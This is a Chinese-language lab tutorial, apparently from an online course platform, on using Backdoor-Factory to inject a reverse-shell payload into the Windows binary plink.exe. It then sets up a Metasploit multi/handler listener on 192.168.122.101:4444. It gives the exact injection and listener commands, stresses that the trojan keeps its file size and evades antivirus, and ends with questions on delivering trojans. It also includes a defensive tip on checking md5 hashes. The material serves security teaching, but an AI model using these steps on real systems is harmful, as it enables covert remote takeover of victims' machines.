# Backdoor-factory 向程序中植入木马

## 一、实验简介

### 1.1 实验介绍

在一般的黑客攻击过程中，上传木马程序或者是诱导目标主机的管理员下载木马程序，是一种很常见的做法。本节实验课将介绍如何使用老牌木马生成工具 Backdoor-Factory 向正常的程序中植入木马。

通常情况下，使用 Backdoor-Factory 对正常的可执行 EXE 程序植入木马，并将 EXE 程序文件上传至操作系统为 Windows 的 目标靶机。只要该 Windows 主机上的用户点击木马程序 EXE 文件，则目标靶机被感染，攻击机与目标靶机建立会话通道。 

在实验中，由于实验楼提供的环境里缺少 Windows 虚拟机，所以无法验证攻击的有效性。在接下来的文档里，主要对  Backdoor-Factory 植入木马及侦听目标靶机进行介绍。本课程以动手实践为主，在实践的过程中对于理论部分，会推荐一些比较精华的阅读资料。

**注意：实验用的云主机因为配置成本较高，会限制次数，每个实验不超过6次**

### 1.2 主要知识点

本实验主要在 Kali Linux 下使用 Backdoor-Factory 对正常程序植入木马文件，并保证正常程序的功能完整性。进行本课程需要掌握一些基本的 Linux 操作系统基本命令。本课程中涉及到的知识点列表如下：

- Linux 系统基本操作知识
- Backdoor-Factory 命令参数具体含义
- Backdoor-Factory 生成木马的具体流程
- 使用 Msfconsole 对目标靶机进行侦听

### 1.3 实验环境

本实验的实验环境由实验楼提供，实验的宿主机操作系统为 Ubuntu 14.04，宿主机上安装有两台虚拟机，虚拟机分别为 Kali Linux，以及另一台虚拟机 Metasploitable2。两台虚拟机的账号和密码分如下列表。由于实验的攻击的对象是 Windows 操作系统，所以本实验暂时不涉及到 Metasploitable2 的操作：

| 主机角色     | 主机名称          | 用户名     | 用户密码   |
| ------------ | ----------------- | ---------- | ---------- |
| 攻击机       | `Kali Linux 2.0`  | `root`     | `toor`     |
| 另一台虚拟机 | `Metasploitable2` | `msfadmin` | `msfadmin` |


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1482822320014.png-wm)


## 二、启动环境

## 2.1 启动实验环境

工具 Backdoor-Factory 在实验楼的 Kali Linux 中已经预先装有。首先在实验楼宿主机 Ubuntu 中启动 Kali Linux 虚拟机，并输入如下命令进行连接：

```
# 在实验楼的终端中，打开 Kali 虚拟机
sudo virsh start Kali

# 使用密码，登录 Kali 虚拟机
ssh root@Kali 
```
**注意：在这步 `ssh root@Kali` 中，可能会出现报错，这是因为打开 Kali 后，需要等待大概`一分钟左右`，服务才会真正开启**如果一切顺利，你将会看到如下页面：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481188145695.png-wm)


## 三、原理介绍

### 3.1 Backdoor-Factory 是什么？

本实验主要介绍使用 Backdoor-Factory 生成后门木马。Backdoor-factory 中文意思是后门工厂，简称 BDF，是一款老牌的后门生成工具。Backdoor-factory 生成的 Win32PE 后门程序，可以绕过一些病毒软件的查杀，从而达到免杀的效果。

Backdoor-Factory 向正常的程序中植入木马，植入过程中不破坏程序的正常功能，对生成的 Win32PE 上传至目标靶机后，只要目标靶机上的用户运行该木马程序，则会在攻击机和目标靶机两者之间建立一个会话通道，攻击者就可以利用这个会话通道控制目标靶机。

### 3.2 Backdoor-Factory 命令参数含义

在使用 Backdoor-Factory 之前，我们先对 Backdoor-Factory 参数含义进行一个了解。在 Kali Linux 实验楼终端中，可以输入 `backdoor-factory` 可以查看工具的帮助命令：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482306854409.png-wm)

其中对于 `backdoor-factory` 常用的命令参数含义如下列表：

| 参数名称 | 参数所代表的含义                                             |
| -------- | ------------------------------------------------------------ |
| `-h`     | 即 `-help` 的缩写，意思是显示 Backdoor-Factory 的帮助信息。  |
| `-f`     | 文件 `--file=FILE` 的缩写，意思是指向要植入后门的正常程序。  |
| `-s`     | 英文 `SHELL` 的缩写，即要插入的 Shellcode，通常可以使用 show 命令查看可用 Shellcode 的多少。 |
| `-H`     | 主机 `HOST` 的缩写，填写的参数为攻击者的主机地址。           |
| `-P`     | 端口信息 `PORT`，在绑定的 shell 中使用，为绑定的端口。在反弹的 shell 中使用，为攻击者的监听地址。常见用在 msfconsole 中的 `LPORT` 这个端口设置。 |
| `-O`     | `OUTPUT` 的缩写，即输出的文件名称，默认生成在 `backdoored` 这个文件下。 |
| `-V`     | 对于执行的命令，显示更详细地输出信息。                       |
| `-X`     | 默认情况下不支持 XP 系统，加上该命令用以支持。               |

## 四、Backdoor-Factory 生成木马后门

### 4.1 Backdoor-Factory 生成木马后门

接下来我们使用 Backdoor-Factory 对正常的 EXE 程序进行木马植入，在 Kali Linux 中的 `/usr/share/windows-binaries/` 文件夹下，默认存在程序 `plink.exe` 这个可以在 windows 上运行的程序。下面的演示，均基于对 `plink.ext` 这个程序的操作。

首先我们使用 Backdoor-Factory 的 `-f` 和 `-s` 命令对 `plink.exe` 程序进行查看，检测有哪些 WinIntelPE32s 可以使用：

```
# 查看该 plink.exe 有哪些 WinIntelPE32s 可以使用
backdoor-factory -f /usr/share/windows-binaries/plink.exe -s show
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482893251799.png-wm)

由上图输出的信息可以知道，我们可以使用的 Shellcode 模块共有 9 个，每个 Shellcode 功能不尽相同：

```
cave_miner_inline
iat_reverse_tcp_inline
iat_reverse_tcp_inline_threaded
iat_reverse_tcp_stager_threaded
iat_user_supplied_shellcode_threaded
meterpreter_reverse_https_threaded
reverse_shell_tcp_inline
reverse_tcp_stager_threaded
user_supplied_shellcode_threaded
```

在这里，我们使用 `reverse_shell_tcp_inline` 这个 Shellcode，作用是会话通道的建立。Shellcode 是一段用于利用软件漏洞而执行的代码，以其经常让攻击者获得 shell 而得名。Shellcode 常常使用机器语言编写。

使用 Backdoor-Factory 对指定的 `plink.exe` 程序植入木马，并设置攻击者的 IP 地址和侦听的端口号：
```
# 使用 Backdoor-Factory 设置攻击者的 IP 地址和端口号
backdoor-factory -f /usr/share/windows-binaries/plink.exe -s reverse_shell_tcp_inline -H 192.168.122.101 -P 4444
```

在输入命令后，可以看到如下代码可利用的漏洞：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482894341133.png-wm)

其中 `[!] Enter your selection: ` 这段代码的意思是选择你要利用的漏洞，`这里我们输入 2`，即使用第二个漏洞的意思，由最后一句代码 `File plink.exe is in the 'backdoored' directory` 知道生成的程序在文件夹 `backdoored` 下。

```
...
...
# 选择你要利用的漏洞
[!] Enter your selection: 2
...
...
# 意思是在文件 backdoored 下
File plink.exe is in the 'backdoored' directory
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482894462113.png-wm)

通过 `ls -l` 命令对比正常程序和木马程序两者之间的大小，在命令行终端中输入如下命令：

```
# 对比正常程序和木马程序两者之间的大小

# 查看原本正常程序的大小
ls -l /usr/share/windows-binaries/plink.exe 

# 查看植入正常程序的木马程序大小
ls -l backdoored/plink.exe
```
![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482895030653.png-wm)

由上面的 ls 可以发现植入木马后，程序大小并未发生变化，这对于隐藏木马是非常有利的。接着我们使用工具 `md5sum` 可以对两个程序的前后结构进行对比，查看是否已经改变。

**小窍门：在平常的网络软件下载过程中，可以使用下载软件的 md5 和官网正版软件的 md5 进行对比，如果两个软件的 md5 不一样，则可能存在被植入了木马的风险**：

```
# 查看原本程序的 md5
md5sum /usr/share/windows-binaries/plink.exe 

# 查看生成的木马文件的 md5
md5sum backdoored/plink.exe
```
![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482894865550.png-wm)


接着将开启 `msfconsole`，并且使用相关模块进行监听。在 Kali Linux 命令行终端中输入命令：

```
# 开启 msfconsole 用以监听
msfconsole

# 使用相应的攻击模块
# 设置攻击者的本地主机 ip 地址
# 设置攻击者的本地主机侦听的端口
# 输入攻击命令

msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set lhost 192.168.122.101
msf > set lport 4444
msf > exploit
```
![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482907669343.png-wm)


输入完命令之后，攻击者的主机进入侦听状态。接下来只要将文件夹 `backdoored` 下的木马文件 `plink.exe` 上传至目标靶机（Windows 操作系统），只要目标靶机上的用户运行木马程序 `plink.exe`，即可建立起目标靶机和攻击机两者之间的联系，此时会在 msfconsole 命令行终端中会获得目标靶机与攻击机的 shell 会话通道。由于实验楼没有安装 Windows 系统，所以这一步步骤在这里不进行演示。

## 五、总结和思考

### 5.1 总结和思考

本实验主要介绍 Backdoor-facotry 的使用方法。首先对要注入代码的目标程序，即 Windows 下的 EXE 格式，使用命令参数查看 `-s Show` 有哪些可以使用模块。接着对向目标程序中植入木马。木马文件的大小并未改变，但由 md5sum 可以知道目标程序代码结构已经发生改变。

最后开启 msfconsole 进行监听，此时将木马文件上传到目标靶机，只要目标靶机上的管理员点击该木马程序，则建立起会话通道，攻击者获得目标靶机管理权限。文章结构为：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482907365256.png-wm)


## 六、课后作业

### 6.1 课后作业

Backdoor-Factory 是一款老牌的木马生成程序，它向正常的程序中植入木马，在不影响正常程序功能的情况下，通过植入木马的方式，迷惑目标主机管理员。让木马程序神不知鬼不觉地被下载到目标靶机中。一般这种程序比较难发现，学习完本实验后，请你思考如下问题：

- 黑客攻击目标主机的过程中，通常有哪几种方法将木马上传到目标靶机？
- 木马程序与原程序相比，文件大小是变大好还是变小好，或是保持不变？